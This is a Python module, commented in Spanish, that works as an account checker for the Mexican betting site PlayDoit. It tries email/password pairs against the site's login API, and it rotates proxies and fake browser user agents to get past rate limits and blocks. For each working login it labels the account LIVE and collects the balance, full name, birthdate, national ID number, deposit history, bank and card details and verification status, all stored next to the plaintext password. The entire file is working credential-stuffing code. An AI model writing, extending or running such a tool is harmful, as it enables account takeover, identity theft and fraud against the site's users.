"""
playdoit_api.py — Cliente HTTP asincrono para la API de PlayDoit.
Basado en la logica funcional de playbot.py (endpoints, headers, autenticacion por cookies).
Totalmente asincrono con httpx y compatible con proxy_pool.call_with_proxy_failover.
"""
import asyncio
import json
import logging
import random
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

import httpx

from proxy_pool import call_with_proxy_failover

logger = logging.getLogger("playdoit_api")

BASE_URL = "https://www.playdoit.mx"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]


@dataclass
class PlaydoitCheckResult:
    ok: bool = False
    account_dead: bool = False
    error: Optional[str] = None
    email: str = ""
    password: str = ""
    balance_cash: float = 0.0
    balance_promo: float = 0.0
    balance_total: float = 0.0
    fullname: str = "Sin dato"
    birthdate: str = "Sin dato"
    national_id: str = "Sin dato"
    total_deposits: float = 0.0
    net_deposits: float = 0.0
    deposit_count: int = 0
    bank_details: str = "Sin dato"
    document_status: str = "Sin dato"
    raw_data: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "email": self.email,
            "password": self.password,
            "fullname": self.fullname,
            "birthdate": self.birthdate,
            "national_id": self.national_id,
            "balance_cash": self.balance_cash,
            "balance_promo": self.balance_promo,
            "balance_total": self.balance_total,
            "total_deposits": self.total_deposits,
            "net_deposits": self.net_deposits,
            "deposit_count": self.deposit_count,
            "bank_details": self.bank_details,
            "document_status": self.document_status,
            "status": "LIVE" if self.ok else "DEAD",
            "dead_reason": self.error if not self.ok else None,
        }


def _get_browser_headers(ua: str) -> Dict[str, str]:
    headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-MX,es;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    if "Firefox" not in ua:
        headers["Sec-Ch-Ua"] = '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"'
        headers["Sec-Ch-Ua-Mobile"] = "?0"
        headers["Sec-Ch-Ua-Platform"] = '"Windows"'
    return headers


class PlaydoitClient:
    """Cliente asincrono para interactuar con PlayDoit."""

    def __init__(self, proxy: Optional[str] = None, timeout: float = 20.0):
        self.proxy = proxy
        self.timeout = timeout
        self.ua = random.choice(USER_AGENTS)

    def _create_client(self) -> httpx.AsyncClient:
        mounts = None
        return httpx.AsyncClient(
            proxy=self.proxy,
            timeout=self.timeout,
            follow_redirects=True,
            verify=False,
        )

    async def check_credentials_and_fetch(
        self, email: str, password: str
    ) -> PlaydoitCheckResult:
        clean_email = email.strip().lower()
        res = PlaydoitCheckResult(email=clean_email, password=password)

        headers = _get_browser_headers(self.ua)

        async with self._create_client() as client:
            # 1. Warmup de cookies
            try:
                await client.get(
                    f"{BASE_URL}/",
                    headers={"User-Agent": self.ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                )
                await asyncio.sleep(random.uniform(0.3, 0.8))
            except (httpx.TransportError, httpx.TimeoutException) as exc:
                # Si el proxy no puede ni conectar al host, propagar como ProxyError para que rote
                logger.warning(f"[playdoit_api] Warmup proxy error ({clean_email}): {exc}")
                raise httpx.ProxyError(f"Warmup proxy error: {exc}")
            except Exception as e:
                logger.warning(f"[playdoit_api] Warmup warning ({clean_email}): {e}")

            # 2. Login POST
            login_url = f"{BASE_URL}/api/login"
            login_data = {
                "login": clean_email,
                "password": password,
                "siteHost": "www.playdoit.mx",
                "privacyPolicyChecked": "true",
            }
            login_resp = await client.post(
                login_url,
                data=login_data,
                headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
            )

            # Si el proxy recibe 403, 429 o 5xx del servidor / gateway, rotar proxy
            if login_resp.status_code in (403, 429):
                raise httpx.ProxyError(f"HTTP {login_resp.status_code} (IP de proxy bloqueada o rate-limited)")

            if login_resp.status_code >= 500:
                raise httpx.ProxyError(f"HTTP {login_resp.status_code} (Error de servidor o gateway PlayDoit)")

            try:
                login_json = login_resp.json()
            except Exception:
                res.error = f"Invalid JSON response (HTTP {login_resp.status_code})"
                res.account_dead = False
                return res

            if not isinstance(login_json, dict):
                res.error = f"Unexpected JSON response format (HTTP {login_resp.status_code})"
                res.account_dead = False
                return res

            if not login_json.get("success"):
                err_msg = login_json.get("message") or login_json.get("error") or "Credenciales invalidas"
                # Solo marcar DEAD ante respuesta explícita de credenciales incorrectas en 200/401
                res.account_dead = True
                res.error = f"Login fallido: {err_msg}"
                return res

            # Login exitoso!
            res.ok = True
            res.raw_data["login"] = login_json

            # 3. Post-login GETs en paralelo
            try:
                balance_task = client.get(f"{BASE_URL}/api/player/balance", headers=headers)
                player_task = client.get(f"{BASE_URL}/api/player", headers=headers)
                methods_task = client.get(f"{BASE_URL}/api/payment/methods", headers=headers)
                details_task = client.get(f"{BASE_URL}/api/player/paymentDetails", headers=headers)
                docs_task = client.get(f"{BASE_URL}/api/player/documents", headers=headers)

                responses = await asyncio.gather(
                    balance_task, player_task, methods_task, details_task, docs_task,
                    return_exceptions=True,
                )
            except Exception as e:
                logger.warning(f"[playdoit_api] Error en requests post-login ({clean_email}): {e}")
                responses = [None] * 5

            # Parsear balance
            r_bal = responses[0]
            if isinstance(r_bal, httpx.Response) and r_bal.status_code == 200:
                try:
                    bj = r_bal.json()
                    res.balance_cash = float(bj.get("cash", 0.0) or 0.0)
                    res.balance_promo = float(bj.get("promo", 0.0) or 0.0)
                    res.balance_total = float(bj.get("balance", (res.balance_cash + res.balance_promo)) or 0.0)
                    res.raw_data["balance"] = bj
                except Exception:
                    pass

            # Parsear player info
            r_ply = responses[1]
            if isinstance(r_ply, httpx.Response) and r_ply.status_code == 200:
                try:
                    pj = r_ply.json()
                    fname = (pj.get("firstName") or "").strip()
                    lname = (pj.get("lastName") or "").strip()
                    full = f"{fname} {lname}".strip()
                    res.fullname = full if full else "Sin dato"
                    res.birthdate = pj.get("birthDate") or "Sin dato"
                    res.national_id = pj.get("nationalIdNumber") or "Sin dato"
                    res.raw_data["player"] = pj
                except Exception:
                    pass

            # Parsear deposits/methods
            r_met = responses[2]
            if isinstance(r_met, httpx.Response) and r_met.status_code == 200:
                try:
                    mj = r_met.json()
                    res.total_deposits = float(mj.get("totalDeposits", 0.0) or 0.0)
                    res.net_deposits = float(mj.get("netDeposits", 0.0) or 0.0)
                    res.deposit_count = int(mj.get("totalDepositCount", 0) or 0)
                    res.raw_data["methods"] = mj
                except Exception:
                    pass

            # Parsear paymentDetails (bancos / tarjetas)
            r_det = responses[3]
            if isinstance(r_det, httpx.Response) and r_det.status_code == 200:
                try:
                    dj = r_det.json()
                    extracted_details = []
                    if isinstance(dj, list):
                        for item in dj:
                            fields = item.get("fields", [])
                            item_dict = {}
                            for f in fields:
                                f_key = f.get("field", "")
                                f_val = f.get("defaultValue", "")
                                if any(k in f_key for k in ("BankName", "Number", "Name")) and f_val:
                                    item_dict[f_key] = f_val
                            if item_dict:
                                extracted_details.append(item_dict)
                    if extracted_details:
                        res.bank_details = json.dumps(extracted_details, ensure_ascii=False)
                    res.raw_data["paymentDetails"] = dj
                except Exception:
                    pass

            # Parsear documents (documentStatus)
            r_doc = responses[4]
            if isinstance(r_doc, httpx.Response) and r_doc.status_code == 200:
                try:
                    dcj = r_doc.json()
                    res.document_status = dcj.get("documentStatus") or "Sin dato"
                    res.raw_data["documents"] = dcj
                except Exception:
                    pass

            return res


async def check_playdoit_account(
    email: str, password: str, proxy: Optional[str] = None
) -> PlaydoitCheckResult:
    """Ejecuta un check individual sobre PlayDoit."""
    client = PlaydoitClient(proxy=proxy)
    return await client.check_credentials_and_fetch(email, password)


async def check_playdoit_with_failover(
    email: str, password: str
) -> Tuple[PlaydoitCheckResult, Optional[str]]:
    """
    Ejecuta el check de PlayDoit rotando proxies en caso de fallo de red/proxy.
    Retorna (resultado, proxy_utilizado).
    """
    async def _runner(proxy: Optional[str] = None) -> PlaydoitCheckResult:
        return await check_playdoit_account(email, password, proxy=proxy)

    try:
        result, used_proxy = await call_with_proxy_failover(
            _runner,
            proxy_kwarg="proxy",
            max_attempts=4,
        )
        return result, used_proxy
    except Exception as exc:
        logger.warning(f"[playdoit_api] Todos los proxies fallaron para {email}: {exc}")
        fail_res = PlaydoitCheckResult(
            email=email.strip().lower(),
            password=password,
            ok=False,
            account_dead=False,
            error=f"Fallo de conexión tras reintentos con proxies: {exc}",
        )
        return fail_res, None

